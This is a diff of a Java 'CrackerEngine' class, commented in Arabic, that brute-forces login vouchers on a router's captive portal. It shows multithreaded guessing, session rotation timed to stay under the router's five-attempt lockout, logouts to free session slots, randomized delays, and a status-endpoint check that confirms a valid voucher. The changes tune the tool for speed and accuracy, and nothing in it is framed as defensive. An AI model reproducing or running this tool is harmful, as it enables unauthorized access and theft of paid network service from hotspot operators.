@@ -14,7 +14,6 @@ public class CrackerEngine {
         void onFound(String voucher, String status);
     }
 
-    // ✅ 4 محاولات فقط لكل جلسة (الراوتر يحظر عند 5)
     private static final int ATTEMPTS_PER_SESSION = 4;
     
     private final Listener listener;
@@ -47,7 +46,7 @@ public class CrackerEngine {
         this.suffix = suffix != null ? suffix : "";
         this.digits = digits;
         this.maxAttempts = maxAttempts;
-        this.threads = Math.max(1, Math.min(threads, 30)); // حتى 30 خيط!
+        this.threads = Math.max(1, Math.min(threads, 30));
         this.pauseMs = Math.max(0, pauseMs);
         this.tried = Collections.synchronizedSet(loadTried());
     }
@@ -76,7 +75,6 @@ public class CrackerEngine {
         try {
             log("▶ بدء المحرك (جلسات متجددة + تحرير فوري)");
             log("  الخيوط: " + threads + " | كل جلسة: " + ATTEMPTS_PER_SESSION + " محاولات");
-            log("  الميزة: تحرير الجلسة فوراً بعد الاستخدام (لا تراكم)");
 
             log("→ تسجيل خروج أولي...");
             logoutSession(null);
@@ -91,7 +89,7 @@ public class CrackerEngine {
                     Thread t = new Thread(() -> workerLoop(wid), "W" + wid);
                     workers.add(t);
                     t.start();
-                    sleep(150);
+                    sleep(100);
                 }
             }
             log("✓ يعمل الآن " + threads + " خيط بجلسات متجددة...");
@@ -109,7 +107,6 @@ public class CrackerEngine {
 
     private void workerLoop(int id) {
         while (!stopped.get() && !found.get() && done.get() < maxAttempts) {
-            // ===== 1. جلسة جديدة نظيفة =====
             Map<String, String> cookies = new HashMap<>();
             Map<String, String> template = openSession(cookies, id);
             
@@ -118,13 +115,12 @@ public class CrackerEngine {
                 continue;
             }
 
-            // ===== 2. إرسال 4 محاولات فقط =====
-            boolean sessionBurned = false;
+            // إرسال 4 محاولات فقط
             for (int i = 0; i < ATTEMPTS_PER_SESSION && !stopped.get() && !found.get(); i++) {
                 if (done.get() >= maxAttempts) break;
                 
                 String v = generate();
-                if (v == null) { sessionBurned = true; break; }
+                if (v == null) break;
                 
                 int cur = done.incrementAndGet();
                 listener.onProgress(cur, maxAttempts, v);
@@ -136,7 +132,6 @@ public class CrackerEngine {
                 if (r.success) {
                     found.set(true);
                     log("[W" + id + "] ✅✅✅ " + v);
-                    // إرسال logout قبل الإعلان (لتحرير الكل)
                     logoutSession(cookies);
                     listener.onFound(v, r.statusJson);
                     return;
@@ -144,7 +139,6 @@ public class CrackerEngine {
                 
                 if (r.busy) {
                     log("[W" + id + "]   🛑 حظر — إغلاق الجلسة");
-                    sessionBurned = true;
                     break;
                 }
                 
@@ -153,20 +147,16 @@ public class CrackerEngine {
                     saveTried(v);
                 }
                 
-                if (pauseMs > 0) sleep(pauseMs + rng.nextInt(200));
+                if (pauseMs > 0) sleep(pauseMs + rng.nextInt(100));
             }
             
-            // ===== 3. تحرير الجلسة (الأهم!) =====
+            // تحرير الجلسة
             logoutSession(cookies);
             cookies.clear();
-            
-            // ===== 4. استراحة قصيرة قبل الجلسة التالية =====
-            if (!sessionBurned) sleep(100 + rng.nextInt(200));
-            else sleep(2000); // استراحة أطول إذا كانت الجلسة محظورة
+            sleep(100 + rng.nextInt(200));
         }
     }
 
-    // 🔑 دالة سحرية: إغلاق الجلسة لتحرير مكانها في الراوتر
     private void logoutSession(Map<String, String> cookies) {
         try {
             HttpURLConnection c = (HttpURLConnection) new URL(logoutUrl).openConnection();
@@ -178,30 +168,24 @@ public class CrackerEngine {
             }
             c.getResponseCode();
             c.disconnect();
-        } catch (Exception e) {
-            // صامت — لا نريد إيقاف المحرك بسبب فشل logout
-        }
+        } catch (Exception e) {}
     }
 
     private Map<String, String> openSession(Map<String, String> cookies, int wid) {
         if (stopped.get()) return null;
         String ua = ua();
         try {
-            // 1. صفحة البداية (كوكيز جديدة)
             HttpURLConnection c1 = (HttpURLConnection) new URL(baseUrl + "/").openConnection();
             c1.setConnectTimeout(4000); c1.setReadTimeout(4000);
             c1.setRequestProperty("User-Agent", ua);
-            c1.setRequestProperty("Connection", "keep-alive");
             c1.getResponseCode();
             extractCookies(c1, cookies);
             c1.disconnect();
             if (stopped.get()) return null;
 
-            // 2. صفحة الفورم (بكوكيز الجلسة الجديدة)
             HttpURLConnection c2 = (HttpURLConnection) new URL(loginUrl).openConnection();
             c2.setConnectTimeout(4000); c2.setReadTimeout(4000);
             c2.setRequestProperty("User-Agent", ua);
-            c2.setRequestProperty("Connection", "keep-alive");
             String ck = cookiesStr(cookies);
             if (!ck.isEmpty()) c2.setRequestProperty("Cookie", ck);
             
@@ -211,14 +195,15 @@ public class CrackerEngine {
             extractCookies(c2, cookies);
             c2.disconnect();
 
-            return extractFields(html, wid);
+            Map<String, String> fields = extractFields(html);
+            log("[W" + wid + "] 🔄 جلسة جديدة");
+            return fields;
         } catch (Exception e) {
-            if (!stopped.get()) log("[W" + wid + "] ⚠ اتصال: " + e.getMessage());
             return null;
         }
     }
 
-    private Map<String, String> extractFields(String html, int wid) {
+    private Map<String, String> extractFields(String html) {
         Map<String, String> fields = new LinkedHashMap<>();
         java.util.regex.Pattern p = java.util.regex.Pattern.compile(
             "<input[^>]*name=[\"']([^\"']+)[\"'][^>]*(?:value=[\"']([^\"']*)[\"'])?",
@@ -255,7 +240,6 @@ public class CrackerEngine {
             c.setReadTimeout(4000);
             c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
             c.setRequestProperty("User-Agent", ua);
-            c.setRequestProperty("Connection", "keep-alive");
             c.setRequestProperty("Referer", loginUrl);
             String ck = cookiesStr(cookies);
             if (!ck.isEmpty()) c.setRequestProperty("Cookie", ck);
@@ -285,13 +269,8 @@ public class CrackerEngine {
             String low = body.toLowerCase();
             if (body.contains("already authorizing") || low.contains("already authorizing"))
                 return Result.busy("already authorizing");
-            
-            if (low.contains("invalid") || low.contains("error") 
-                || low.contains("wrong") || low.contains("denied")) {
-                return Result.bad("خاطئ");
-            }
 
-            // فحص الحالة
+            // 🔥 السر: فحص الحالة أولاً قبل الحكم على الرقم!
             sleep(80);
             HttpURLConnection c4 = (HttpURLConnection) new URL(statusUrl).openConnection();
             c4.setConnectTimeout(4000); c4.setReadTimeout(4000);
@@ -305,11 +284,18 @@ public class CrackerEngine {
                 JSONObject o = new JSONObject(statusBody);
                 String li = o.optString("logged_in", "").toLowerCase();
                 String un = o.optString("username", "").trim();
-                if ((li.equals("yes") || li.equals("true") || li.equals("1")) && voucher.equals(un))
+                if ((li.equals("yes") || li.equals("true") || li.equals("1")) && voucher.equals(un)) {
                     return Result.ok(statusBody);
+                }
             } catch (Exception e) {}
+
+            // إذا وصلنا هنا، الراوتر لم يسجل الدخول. الآن نفحص لو كان الرد يحتوي على خطأ
+            if (low.contains("invalid") || low.contains("error") 
+                || low.contains("wrong") || low.contains("denied")) {
+                return Result.bad("خاطئ");
+            }
             
-            return Result.bad("خاطئ");
+            return Result.bad(null);
         } catch (Exception e) {
             return Result.bad("network: " + e.getMessage());
         }
